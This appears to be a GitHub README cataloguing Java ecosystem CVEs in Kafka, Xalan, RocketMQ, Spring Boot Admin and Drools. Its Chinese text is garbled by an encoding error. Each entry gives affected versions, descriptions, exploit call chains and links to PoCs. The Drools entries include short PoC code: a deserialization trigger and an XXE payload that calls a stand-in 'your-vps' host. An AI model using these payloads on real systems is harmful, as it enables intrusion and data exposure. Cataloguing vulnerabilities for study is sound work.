# Java-CVE-Lists

> è¿™ä¸ªä»“åº“ä¸»è¦ç”¨äºè®°å½•ä¸€äº›Javaç”Ÿæ€çš„**CVEç®€è¦è¯´æ˜ã€åˆ©ç”¨æ¡ä»¶**ä»¥åŠ**ç›¸å…³å­¦ä¹ æ–‡ç« **ã€‚æ¯”è¾ƒç®€å•çš„CVEä¼šç»™å‡ºç®€æ˜“pocã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæœ¬ä»“åº“å…³æ³¨çš„æ˜¯ç›®å‰ä¸»æµçš„JavaæŠ€æœ¯ä¸­å­˜åœ¨çš„å†å²æ¼æ´ï¼Œè€Œä¸æ˜¯è€å¤è‘£ã€‚ï¼ˆæŒç»­æ›´æ–°ä¸­...ï¼‰å¦‚æœ‰å»ºè®®å…¥é€‰æ¼æ´ï¼Œæ¬¢è¿ğŸ‘æå‡ºissueğŸ‘€ã€‚

- [Java-CVE-Lists](#java-cve-lists)
    - [Kafka](#Kafka)
      - [CVE-2023-25194](#cve-2023-25194)
    - [Apache Xalan Java XSLT](#apache-xalan-java-xslt)
      - [CVE-2022-34169](#cve-2022-34169)
    - [RocketMQ](#rocketmq)
      - [CVE-2019-17572(ç›®å½•ç©¿è¶Š)](#cve-2019-17572ç›®å½•ç©¿è¶Š)
    - [Spring-boot-Admin](#spring-boot-admin)
      - [CVE-2022-46166(spelæ³¨å…¥)](#cve-2022-46166spelæ³¨å…¥)
    - [Drools](#drools)
      - [CVE-2022-1415](#cve-2022-1415)
      - [CVE-2021-41411](#cve-2021-41411)
---

### Kafka

#### [CVE-2023-25194](https://nvd.nist.gov/vuln/detail/CVE-2023-25194)

##### åˆ©ç”¨æ¡ä»¶

> Apache Kafka 2.3.0 - 3.3.2

##### æ¼æ´è¯´æ˜

- ä½¿ç”¨ **KAFKA CONNECT**é€šè¿‡**SASL JAAS JNDILOGIN**æ¨¡å—åŒ–é…ç½®å¯èƒ½è¿›è¡Œ**RCE/æ‹’ç»æœåŠ¡æ”»å‡»**

##### æ¼æ´ç¯å¢ƒåŠpoc

- https://github.com/luelueking/Java-CVE-Lists/tree/main/CVE-2023-25194

##### æ¼æ´åŸç†(åˆ©ç”¨é“¾)

- ```java
  new KafkaProducer<>(props)
  	-> KafkaProducer#KafkaProducer(...)
  		-> KafkaProducer#newSender(logContext, kafkaClient, this.metadata)
  			-> ClientUtils#createChannelBuilder(this.producerConfig, this.time, logContext)
  				-> ChannelBuilders#clientChannelBuilder(...;
  					-> ChannelBuilders#create(...;
  						-> ((ChannelBuilder)channelBuilder)#configure(configs);
  							-> LoginManager#acquireLoginManager(...)
  								-> new LoginManager(jaasContext, saslMechanism, configs, loginMetadata)
  									-> LoginContext#login()
  										-> LoginContext#invokePriv(LOGIN_METHOD)
  											-> LoginContext#invoke(methodName)
  												-> JndiLoginModule#login()
  													-> JndiLoginModule#attemptAuthentication(true)
  														-> InitialContext#lookup(userProvider)
  ```

---

### Apache Xalan Java XSLT

#### [CVE-2022-34169](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-34169)

##### åˆ©ç”¨æ¡ä»¶

> åªè¦æœ‰ XML xslt è½¬æ¢ä½¿ç”¨åœºæ™¯

##### æ¼æ´è¯´æ˜

- æŠŠxsltè½¬æ¢æˆclassçš„æ—¶å€™å­˜åœ¨æº¢å‡ºï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç²¾å¿ƒæ„é€ çš„æ¶æ„xsltï¼Œé€šè¿‡xalanè½¬æ¢åå¾—åˆ°æ¶æ„çš„classï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæ¶æ„çš„classä¼šè¢«å®ä¾‹åŒ–å¯¼è‡´ä»£ç æ‰§è¡Œã€‚

##### æ¼æ´åˆ†æ

- https://blog.noah.360.net/xalan-j-integer-truncation-reproduce-cve-2022-34169/

##### æ¨èå·¥å…·

- https://github.com/flowerwind/AutoGenerateXalanPayload

---

### RocketMQ

#### [CVE-2019-17572(ç›®å½•ç©¿è¶Š)](https://github.com/apache/rocketmq/issues/1637)

##### åˆ©ç”¨æ¡ä»¶

> RocketMQ4.6.0 æœ€æ–°ç‰ˆæœ¬
>
> autoCreateTopicEnable=trueé»˜è®¤è®¾ç½®

##### æ¼æ´è¯´æ˜

- è‡ªåŠ¨åˆ›å»ºä¸»é¢˜æ—¶å­˜åœ¨ç›®å½•ç©¿è¶Šï¼Œå¯ä»¥è¾¾åˆ°ä»»æ„åˆ›å»ºæ–°æ–‡ä»¶å¤¹çš„æ•ˆæœã€‚

##### æ¼æ´åˆ†æ

- https://github.com/luelueking/Java-CVE-Lists/tree/main/CVE-2019-17572

---

### Spring-boot-Admin

#### [CVE-2022-46166(spelæ³¨å…¥)](https://github.com/codecentric/spring-boot-admin/security/advisories/GHSA-w3x5-427h-wfq6)

##### åˆ©ç”¨æ¡ä»¶

> Affected versions
>
> < 2.6.10
>
> < 2.7.8
>
> < 3.0.0-M6

##### æ¼æ´è¯´æ˜

- spring-boot-adminçš„æ¶ˆæ¯é€šçŸ¥å™¨ä¸­messageå¯ä»¥æ‰§è¡Œä»»æ„spelè¡¨è¾¾å¼å¯¼è‡´ä»£ç æ³¨å…¥

##### æ¼æ´ç¯å¢ƒåŠè¯¦æƒ…

- https://github.com/luelueking/Java-CVE-Lists/tree/main/CVE-2022-46166/

---

### Drools

#### [CVE-2022-1415](https://bugzilla.redhat.com/show_bug.cgi?id=2065505)

##### åˆ©ç”¨æ¡ä»¶

> Affected versions
> < drools 7.69.0.Final

##### æ¼æ´è¯´æ˜

- droolsä¸­æ²¡æœ‰å¯¹streamUtilsç›´æ¥è°ƒç”¨ObjectInputStreamçš„readObject()æ–¹æ³•å¹¶ä¸”æ²¡æœ‰è¿›è¡Œé™åˆ¶ï¼Œå¯èƒ½æˆä¸ºååºåˆ—åŒ–çš„å…¥å£

##### ç®€æ˜“poc

```java
        // ä½¿ç”¨URLDNSé“¾ç”Ÿæˆpayload.txt
        FileInputStream in = new FileInputStream("payload.txt");
        KnowledgeBuilderImpl builder = new KnowledgeBuilderImpl();
        Resource resource = new InputStreamResource(in);
        builder.addKnowledgeResource(resource, ResourceType.PKG,null);
```

#### [CVE-2021-41411](https://github.com/advisories/GHSA-rc57-9r3x-98cq)

##### åˆ©ç”¨æ¡ä»¶

> Affected versions
> < drools 7.59.0.Final

##### æ¼æ´è¯´æ˜

- XML External Entity (XXE) vulnerability in KieModuleMarshaller.java. The Validator class is not used correctly

##### ç®€æ˜“poc

```java
        FileInputStream fileInputStream = new FileInputStream("payload.xml");
        KieModuleModelImpl.fromXML(fileInputStream);
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
        <!ENTITY xxe SYSTEM "http://your-vps">
        ]>
<evil>&xxe;</evil>
```

